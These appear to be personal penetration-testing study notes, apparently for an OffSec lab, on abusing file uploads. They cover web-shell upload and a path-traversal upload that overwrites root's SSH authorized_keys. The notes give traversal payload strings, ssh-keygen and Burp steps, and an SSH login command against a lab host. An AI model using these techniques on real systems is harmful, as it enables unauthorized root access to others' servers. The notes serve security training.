![[Pasted image 20240424192323.png]]



always look for any edits or upload
check existing file and upload shell and search URL


offsec loves simple-backdoor.php

```
ls -la /usr/share/webshells
```
# non executable file

When there's a file upload, check in burp whether it has filename or something option (which there will be)

try to change upload path for something like below
```
../../../../../../root/.ssh/id_rsa
../../.././../../root/.ssh/authorized_keys
```

## basically overwrite files

if we can change id_rsa or ssh keys which were created by sshkeygen then we can directly log in there if ssh port is open in system

## process

### create ssh-keygen

![[Pasted image 20240427200614.png]]

```
ssh-keygen
```

![[Pasted image 20240427200643.png]]
neat & clean version

re-write fileup.pub as whatever file we want

![[Pasted image 20240427200804.png]]

### change path

we can do it with repeater also but with interceptor it is recommended for me as it will directly write there

![[Pasted image 20240427200932.png]]

```
ssh -p 2222 -i fileup root@mountaindesserts.com
```

#VOILA

